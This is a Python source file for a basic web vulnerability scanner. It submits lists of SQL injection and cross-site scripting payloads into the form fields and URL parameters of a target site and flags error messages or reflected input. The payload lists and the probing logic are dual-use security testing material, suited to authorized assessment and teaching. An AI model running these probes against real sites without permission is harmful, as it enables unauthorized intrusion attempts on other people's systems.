import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import sys

# Define common payloads for vulnerabilities
SQL_INJECTION_PAYLOADS = [
    "' OR 1=1 --",
    "' OR '1'='1",
    "\" OR 1=1 --",
    "\" OR \"1\"=\"1",
    "1' UNION SELECT NULL, NULL, NULL --", # Example with 3 columns, adjust as needed
    "ORDER BY 1--", # For column enumeration
    "admin'--",
    "admin' #",
    "admin'/*",
    "foo' or 1=1--",
    "foo' or '1'='1'",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "';alert(String.fromCharCode(88,83,83))//",
    "\" onmouseover=\"alert('XSS')\" foo=\"",
    "><script>alert('XSS')</script>",
    "<body onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\">",
]

# User agent to make requests appear more like a browser
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

def make_request(url: str, method: str = 'GET', data: dict = None, params: dict = None) -> requests.Response | None:
    """
    Makes an HTTP request and handles basic errors.

    Args:
        url (str): The URL to request.
        method (str): HTTP method (GET, POST).
        data (dict): Dictionary for POST data.
        params (dict): Dictionary for GET parameters.

    Returns:
        requests.Response | None: The response object or None if an error occurs.
    """
    try:
        if method.upper() == 'POST':
            response = requests.post(url, data=data, headers=HEADERS, timeout=10, allow_redirects=True)
        else:
            response = requests.get(url, params=params, headers=HEADERS, timeout=10, allow_redirects=True)
        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
        return response
    except requests.exceptions.HTTPError as errh:
        print(f"HTTP Error for {url}: {errh}")
    except requests.exceptions.ConnectionError as errc:
        print(f"Error Connecting to {url}: {errc}")
    except requests.exceptions.Timeout as errt:
        print(f"Timeout Error for {url}: {errt}")
    except requests.exceptions.RequestException as err:
        print(f"An unexpected error occurred for {url}: {err}")
    return None

def check_sql_injection(url: str, forms: list, session: requests.Session) -> bool:
    """
    Checks for basic SQL Injection vulnerabilities in forms and URL parameters.

    Args:
        url (str): The base URL to test.
        forms (list): A list of form dictionaries (containing action, method, and input names).
        session (requests.Session): The requests session to use for making requests.

    Returns:
        bool: True if a potential SQL Injection is found, False otherwise.
    """
    print(f"\n--- Checking SQL Injection for {url} ---")
    vulnerable = False

    # Test URL parameters
    parsed_url = urlparse(url)
    query_params = dict(qp.split('=', 1) for qp in parsed_url.query.split('&') if '=' in qp) if parsed_url.query else {}

    if query_params:
        print("  Testing URL query parameters...")
        for param_name in query_params:
            original_value = query_params[param_name]
            for payload in SQL_INJECTION_PAYLOADS:
                test_params = {k: v for k, v in query_params.items()}
                test_params[param_name] = payload
                
                print(f"    Testing parameter '{param_name}' with payload: '{payload}'...")
                response = make_request(url, params=test_params)
                
                if response:
                    # Common SQLi detection indicators
                    if "syntax error" in response.text.lower() or \
                       "mysql" in response.text.lower() or \
                       "union all select" in response.text.lower() or \
                       "incorrect syntax" in response.text.lower() or \
                       "unclosed quotation mark" in response.text.lower():
                        print(f"    ðŸš¨ Potential SQL Injection found in URL parameter '{param_name}'!")
                        print(f"      Payload: {payload}")
                        vulnerable = True
                        break # Move to next parameter if vulnerable
            if vulnerable: break # If URL is vulnerable, no need to continue with other URL params

    # Test forms
    if forms:
        print("  Testing forms...")
        for form in forms:
            form_action = urljoin(url, form.get('action', ''))
            form_method = form.get('method', 'GET').upper()
            form_inputs = form.get('inputs', [])

            for input_name, input_type in form_inputs:
                if input_type not in ['text', 'search', 'email', 'password']: # Only test relevant input types
                    continue

                for payload in SQL_INJECTION_PAYLOADS:
                    test_data = {}
                    for name, _type in form_inputs:
                        test_data[name] = "test" # Fill other fields with generic data
                    test_data[input_name] = payload # Apply payload to the current input

                    print(f"    Testing form input '{input_name}' with payload: '{payload}'...")
                    response = make_request(form_action, method=form_method, data=test_data)

                    if response:
                        # Common SQLi detection indicators
                        if "syntax error" in response.text.lower() or \
                           "mysql" in response.text.lower() or \
                           "union all select" in response.text.lower() or \
                           "incorrect syntax" in response.text.lower() or \
                           "unclosed quotation mark" in response.text.lower():
                            print(f"    ðŸš¨ Potential SQL Injection found in form input '{input_name}' of form action '{form_action}'!")
                            print(f"      Payload: {payload}")
                            vulnerable = True
                            break # Move to next form input if vulnerable
                if vulnerable: break # If form is vulnerable, no need to continue with other form inputs
            if vulnerable: break # If a form is vulnerable, no need to continue with other forms

    if not vulnerable:
        print("  âœ… No obvious SQL Injection vulnerabilities detected.")
    return vulnerable


def check_xss(url: str, forms: list, session: requests.Session) -> bool:
    """
    Checks for basic XSS vulnerabilities in forms and URL parameters by checking payload reflection.

    Args:
        url (str): The base URL to test.
        forms (list): A list of form dictionaries.
        session (requests.Session): The requests session to use for making requests.

    Returns:
        bool: True if a potential XSS is found, False otherwise.
    """
    print(f"\n--- Checking XSS for {url} ---")
    vulnerable = False

    # Test URL parameters
    parsed_url = urlparse(url)
    query_params = dict(qp.split('=', 1) for qp in parsed_url.query.split('&') if '=' in qp) if parsed_url.query else {}

    if query_params:
        print("  Testing URL query parameters...")
        for param_name in query_params:
            for payload in XSS_PAYLOADS:
                test_params = {k: v for k, v in query_params.items()}
                test_params[param_name] = payload
                
                print(f"    Testing parameter '{param_name}' with payload: '{payload}'...")
                response = make_request(url, params=test_params)
                
                if response and payload in response.text:
                    print(f"    ðŸš¨ Potential XSS found in URL parameter '{param_name}'!")
                    print(f"      Payload: {payload} reflected in response.")
                    vulnerable = True
                    break
            if vulnerable: break

    # Test forms
    if forms:
        print("  Testing forms...")
        for form in forms:
            form_action = urljoin(url, form.get('action', ''))
            form_method = form.get('method', 'GET').upper()
            form_inputs = form.get('inputs', [])

            for input_name, input_type in form_inputs:
                if input_type not in ['text', 'search', 'email', 'password']:
                    continue

                for payload in XSS_PAYLOADS:
                    test_data = {}
                    for name, _type in form_inputs:
                        test_data[name] = "test"
                    test_data[input_name] = payload

                    print(f"    Testing form input '{input_name}' with payload: '{payload}'...")
                    response = make_request(form_action, method=form_method, data=test_data)

                    if response and payload in response.text:
                        print(f"    ðŸš¨ Potential XSS found in form input '{input_name}' of form action '{form_action}'!")
                        print(f"      Payload: {payload} reflected in response.")
                        vulnerable = True
                        break
                if vulnerable: break
            if vulnerable: break
            
    if not vulnerable:
        print("  âœ… No obvious XSS vulnerabilities detected.")
    return vulnerable

def get_all_forms(url: str) -> list:
    """
    Extracts all HTML forms from a given URL.

    Args:
        url (str): The URL to extract forms from.

    Returns:
        list: A list of dictionaries, each representing a form with its action, method, and input names.
    """
    response = make_request(url)
    if not response:
        return []

    soup = BeautifulSoup(response.content, 'html.parser')
    forms = []
    for form_tag in soup.find_all('form'):
        form = {
            'action': form_tag.get('action', ''),
            'method': form_tag.get('method', 'GET').upper(),
            'inputs': []
        }
        for input_tag in form_tag.find_all(['input', 'textarea', 'select']):
            input_name = input_tag.get('name')
            input_type = input_tag.get('type', 'text') # Default to text if type is missing (e.g., textarea)
            if input_name:
                form['inputs'].append((input_name, input_type))
        forms.append(form)
    return forms

def scan_web_application(target_url: str):
    """
    Orchestrates the web application vulnerability scan.

    Args:
        target_url (str): The starting URL of the web application to scan.
    """
    print(f"\n--- Starting Web Application Vulnerability Scan ---")
    print(f"Target URL: {target_url}")
    print("Disclaimer: This is a basic scanner and may not detect all vulnerabilities.")
    print("Always obtain explicit permission before scanning any system.")

    session = requests.Session() # Use a session to maintain cookies and connection pooling

    # Step 1: Discover forms on the target URL
    print("\n[+] Discovering forms...")
    forms = get_all_forms(target_url)
    if forms:
        print(f"  Found {len(forms)} form(s) on {target_url}")
        for i, form in enumerate(forms):
            print(f"    Form {i+1}: Action='{form['action']}', Method='{form['method']}', Inputs={[name for name, _ in form['inputs']]}")
    else:
        print("  No forms found on the target URL.")

    # Step 2: Check for SQL Injection
    sql_vulnerable = check_sql_injection(target_url, forms, session)

    # Step 3: Check for XSS
    xss_vulnerable = check_xss(target_url, forms, session)

    print("\n--- Scan Summary ---")
    if sql_vulnerable or xss_vulnerable:
        print("ðŸš¨ Vulnerabilities Found!")
        if sql_vulnerable:
            print("  - Potential SQL Injection detected.")
        if xss_vulnerable:
            print("  - Potential XSS detected.")
    else:
        print("âœ… No common vulnerabilities (SQLi, XSS) detected with basic payloads.")
    print("Scan finished. Remember this is a basic scan. Manual testing and advanced tools are recommended for comprehensive security assessments.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python web_scanner.py <target_url>")
        print("Example: python web_scanner.py http://testphp.vulnweb.com")
        sys.exit(1)

    target_url = sys.argv[1]
    scan_web_application(target_url)
